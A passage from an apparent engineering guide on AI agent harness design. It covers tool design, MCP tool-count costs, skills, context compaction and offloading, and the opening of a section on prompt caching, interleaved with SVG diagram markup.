<text x="853.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Operate</text>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c3-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M138.0 100.0 L292 64 L292 252 L138.0 100.0 Z" fill="#FF9900" opacity="0.10"/>
<line x1="138.0" y1="100.0" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="138.0" y1="100.0" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Four ways to expose capability, and their context cost</text>
<rect x="316.0" y="150.0" width="70.0" height="34.0" rx="5" fill="#232F3E" stroke="#232F3E" stroke-width="1.2"/>
<text x="351.0" y="170.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Model</text>
<rect x="420.0" y="98.0" width="172.0" height="30.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="506.0" y="111.5" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">Declared tools</text>
<text x="506.0" y="123.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">read, edit, search, run</text>
<line x1="388.5" y1="153.9" x2="455.8" y2="130.5" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c3-g)"/>
<rect x="420.0" y="134.0" width="172.0" height="30.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="506.0" y="147.5" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">Tool search</text>
<text x="506.0" y="159.0" font-size="8.5" fill="#44546f" text-anchor="middle" font-weight="normal">catalog, load on demand</text>
<line x1="388.5" y1="162.6" x2="417.5" y2="159.3" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c3-g)"/>
<rect x="420.0" y="170.0" width="172.0" height="30.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="506.0" y="183.5" font-size="9.5" fill="#1e7e34" text-anchor="middle" font-weight="600">Skills</text>
<text x="506.0" y="195.0" font-size="8.5" fill="#1e7e34" text-anchor="middle" font-weight="normal">name and one line, then SKILL.md</text>
<line x1="388.5" y1="171.4" x2="417.5" y2="174.7" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c3-g)"/>
<rect x="420.0" y="206.0" width="172.0" height="30.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="506.0" y="219.5" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">Code mode</text>
<text x="506.0" y="231.0" font-size="8.5" fill="#44546f" text-anchor="middle" font-weight="normal">one run_code call that loops</text>
<line x1="388.5" y1="180.1" x2="455.8" y2="203.5" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c3-g)"/>
<text x="622.0" y="106.0" font-size="10" fill="#1a1a2e" text-anchor="start" font-weight="700">Advertising 200 capabilities</text>
<text x="622.0" y="119.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">tokens in context on every turn</text>
<text x="622.0" y="139.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">200 tool declarations</text>
<rect x="622.0" y="144.0" width="250.0" height="14.0" rx="2" fill="#c3cbd6" stroke="none" stroke-width="1.2"/>
<rect x="622.0" y="144.0" width="62.5" height="14.0" rx="2" fill="#232F3E" stroke="none" stroke-width="1.2"/>
<text x="622.0" y="171.0" font-size="9" fill="#1a1a2e" text-anchor="start" font-weight="600">20,000 to 80,000</text>
<text x="622.0" y="190.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">200 skills</text>
<rect x="622.0" y="195.0" width="6.2" height="14.0" rx="1" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="634.0" y="206.0" font-size="9" fill="#1a1a2e" text-anchor="start" font-weight="600">about 2,000</text>
<line x1="622.0" y1="222.0" x2="872.0" y2="222.0" stroke="#8a96a8" stroke-width="1"/>
<text x="622.0" y="234.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">0</text>
<text x="747.0" y="234.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">40,000</text>
<text x="872.0" y="234.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">80,000</text>
</svg>
</div>

Good tools share five properties. They are orthogonal, meaning one tool does one thing, because an `edit_file` and a `str_replace` that overlap on most of the same job are worse than either alone. They are named for what they do rather than how they work, so `search_symbols` beats `treesitter_query`. They are descriptive, because the tool description is prompt engineering and needs to state when to use the tool, when not to, and what shape of output to expect. They are failure-tolerant, returning a machine-readable status the model can react to instead of an opaque exception that kills the loop. Finally they are cheap to preview, because read-only tools that are safe and fast let the model explore freely before it commits.

### 3.1 Avoid the god-tool

A common mistake gives a coding agent one `execute_shell` tool. The model then uses `cat` instead of a file reader and `grep` instead of a search tool, and every destructive command goes through the same unrestricted entry point. Purpose-built tools for read, edit, search, and run give the harness one place per action to validate arguments and apply permissions.

### 3.2 The tool-count problem

The opposite mistake is too many tools. MCP, the Model Context Protocol, is a standard for exposing tools to agents over a server interface, and a few connected MCP servers can add hundreds of tool declarations. Every declaration sits in the context window on every turn, whether the model uses it or not. In an [Anthropic example](https://www.anthropic.com/engineering/advanced-tool-use), five MCP servers expose 58 tools whose declarations take about 55,000 tokens before the conversation starts.

Three techniques fix this. Tool search shows the model a short catalog and loads full declarations on demand. Deferred loading keeps a whole bundle of instructions and tools out of the prompt until the model asks for it. Code mode replaces many tool calls with a single `run_code` call, and the model writes a script that calls your functions. The script runs its loop in one round trip, instead of one model turn per call. In the same Anthropic example, tool search cut the tokens spent on tool declarations by 85%.

### 3.3 Skills as tools you do not declare

A *skill* is a folder holding a markdown file of instructions and optional scripts. The harness lists the available skills in the system prompt by name and one-line description, and the model reads the full instructions with an ordinary file-read tool when it decides the skill applies.

[Anthropic documents](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview) a cost of about 100 tokens per skill for its name and description, and the full instructions enter the context only when the model reads them. A skill needs no new tool, because the model reads it with a file-read tool that it already has. Add a skill before you add a tool.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), Pi (A.4), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---

## 4. Context management

Context management decides what the model sees on each turn. A 200,000-token window fills quickly with a few long files, the conversation history, and the tool declarations. A full window makes each turn slower and more expensive, and it makes the goal harder for the model to track.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c4-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c4-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c4-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c4-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c4-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c4-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#edf0f4"/>
<text x="55.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Plan</text>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#edf0f4"/>
<text x="397.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Test</text>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#edf0f4"/>
<text x="625.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Deploy</text>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#edf0f4"/>
<text x="853.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Operate</text>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c4-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M173.3 111.5 L292 64 L292 252 L173.3 111.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="173.3" y1="111.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="173.3" y1="111.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#1a1a2e" text-anchor="start" font-weight="700">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Compaction and offloading keep the window usable</text>
<text x="316.0" y="106.0" font-size="10" fill="#1a1a2e" text-anchor="start" font-weight="700">Context window</text>
<rect x="316.0" y="114.0" width="58.0" height="32.0" rx="0" fill="#232F3E" stroke="none" stroke-width="1.2"/>
<text x="345.0" y="134.0" font-size="9.5" fill="#fff" text-anchor="middle" font-weight="600">Static</text>
<rect x="374.0" y="114.0" width="96.0" height="32.0" rx="0" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="422.0" y="134.0" font-size="9.5" fill="#fff" text-anchor="middle" font-weight="600">Dynamic</text>
<rect x="470.0" y="114.0" width="77.0" height="32.0" rx="0" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="508.5" y="134.0" font-size="9.5" fill="#fff" text-anchor="middle" font-weight="600">Working</text>
<rect x="547.0" y="114.0" width="96.0" height="32.0" rx="0" fill="#6b7a90" stroke="none" stroke-width="1.2"/>
<text x="595.0" y="134.0" font-size="9.5" fill="#fff" text-anchor="middle" font-weight="600">History</text>
<rect x="643.0" y="114.0" width="57.0" height="32.0" rx="0" fill="#e3e8ef" stroke="none" stroke-width="1.2"/>
<text x="671.5" y="134.0" font-size="9.5" fill="#6b7a90" text-anchor="middle" font-weight="600">free</text>
<line x1="623.2" y1="106" x2="623.2" y2="156" stroke="#FF9900" stroke-width="2" stroke-dasharray="4 3"/>
<text x="629.2" y="166.0" font-size="9" fill="#9a5b00" text-anchor="start" font-weight="600">compact at 70 to 85% full</text>
<rect x="316.0" y="196.0" width="190.0" height="26.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="411.0" y="212.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">Summary keeps decisions and reasons</text>
<line x1="600.0" y1="149.0" x2="509.0" y2="204.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c4-gr)"/>
<text x="560.0" y="186.0" font-size="8.5" fill="#1e7e34" text-anchor="start" font-weight="normal">older turns</text>
<rect x="742.0" y="100.0" width="154.0" height="30.0" rx="5" fill="#fffae6" stroke="#f5c56b" stroke-width="1.2"/>
<text x="819.0" y="113.5" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="600">Tool result</text>
<text x="819.0" y="125.0" font-size="8.5" fill="#44546f" text-anchor="middle" font-weight="normal">40,000 tokens</text>
<path d="M776.0 177.0 v38.0 a48.0 7.0 0 0 0 96.0 0 v-38.0" fill="#34465c" stroke="#232F3E" stroke-width="1.2"/>
<ellipse cx="824.0" cy="177.0" rx="48.0" ry="7" fill="#8a96a8" stroke="#232F3E" stroke-width="1.2"/>
<text x="824.0" y="202.0" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Storage</text>
<text x="824.0" y="214.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">full result</text>
<line x1="822.0" y1="133.0" x2="823.0" y2="168.0" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c4-d)"/>
<text x="830.0" y="154.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">offload</text>
<path d="M740 112 C690 104 600 98 512 112" fill="none" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c4-b)"/>
<text x="630.0" y="99.0" font-size="8.5" fill="#0052CC" text-anchor="middle" font-weight="600">1,500-token preview and reference</text>
<path d="M774 202 C700 206 590 186 532 150" fill="none" stroke="#8a96a8" stroke-width="1.4" stroke-dasharray="4 3" marker-end="url(#c4-g)"/>
<text x="700.0" y="240.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">full result read back only on demand</text>
</svg>
</div>

Four kinds of content compete for that window. Static context is the system prompt, holding rules, tone, the tool list, and safety guardrails, and it loads once and stays cheap. Dynamic context is the retrieved material, meaning files, past sessions, and documentation. Working state is the scratchpad of the current run, holding the task list, the files edited so far, subagent results, and the tool call log. Compacted history is everything older, rewritten as a summary.

### 4.1 Retrieval: symbolic beats semantic for code

For code agents, symbolic retrieval usually beats vector search, because a definition and its call sites are more useful than a set of vaguely similar strings. Use a language server or an abstract syntax tree when one is available.

Keyword search still earns its place. BM25, a classic keyword ranking function, beats embeddings whenever the user names an identifier exactly.

### 4.2 Compaction

When history grows past a budget, the harness rewrites older turns into a summary. Done well, compaction preserves the decisions and their reasons and drops the raw tool output. Done badly, it silently drops the reason the agent chose a particular approach and confuses the agent two turns later.

Two details decide which you get. The first is the trigger. Compact when the window passes a fixed fraction, such as 85% full, and not on a turn count, because the size of a turn varies widely. The second is who performs it. Some providers offer server-side compaction, which means the provider rewrites the history and you never pay to send it.

### 4.3 Context offloading

When a tool returns 40,000 tokens of log output, do not put it in the context. Write it to storage, put a short preview and a reference in the context, and let the agent read the full content back if it turns out to need it. Keep the stored artifacts in the session directory when a session exists, so that a resumed session can still reach them. Without a session, a temporary directory that does not outlive the process is enough.

Pair offloading with a hard truncation threshold of about 1,500 tokens per tool result. [AWS reports](https://strandsagents.com/blog/introducing-strands-harness/) that its open-source harness cost 28% less than other harnesses on the same models across six benchmarks, and that three context defaults drove most of the saving. The defaults are this truncation threshold, compaction above 85% of the window, and overflow recovery inside the loop.

### 4.4 Context resets, not only compaction

Compaction keeps a conversation going, but it leaves one failure in place. As the context fills, some models wrap up early and close out work that is not finished. This behavior is called context anxiety. Compaction reduces the pressure, but the window still looks crowded to the model.

A full reset removes the problem. Start each session with a fresh context, and bridge the gap with structured artifacts on disk instead of a summary in the window, as chapter 6 describes. More capable models handle long context well enough that compaction alone is often sufficient. Re-test the need for resets on every model upgrade, as chapter 12 explains.

### 4.5 Overflow recovery

Context overflow will happen, so handle it inside the loop rather than at the edges. When a request overflows, unwind the most recent completed turns, compact, and retry within the same run, so that the run keeps its progress.

### 4.6 Progressive disclosure

Long-form knowledge loads on demand instead of on the first turn. Style guides, playbooks, and API documentation stay in files that the model reads when it needs them. Skills, steering files, and deferred tool bundles apply the same idea. Keep in the context only what the model uses this turn, and leave everything else in files.

Supporting frameworks: Strands (A.1), AgentCore (A.2), Pi (A.4), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---

## 5. Prompt caching

Every turn of an agent loop resends almost the same prefix, which is the system prompt, the tool definitions, and the prior conversation. Prompt caching reuses that stable prefix, so each turn costs less and returns sooner. The mechanism is not portable. Some providers require explicit cache points in the request and a flag on the tool definitions. Others cache automatically on the server, and there is nothing to set. Know which kind of provider you are on before you tune anything. Even automatic caching needs a stable key. Derive the key from the session identifier rather than from the request content, so that every request in a long session lands on the same cache.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c5-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c5-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c5-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c5-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c5-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c5-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#FF9900"/>
<text x="55.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Plan</text>
<path d="M50.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#FF9900"/>
<text x="853.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Operate</text>
<path d="M848.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c5-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M195.1 141.5 L292 64 L292 252 L195.1 141.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="195.1" y1="141.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="195.1" y1="141.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
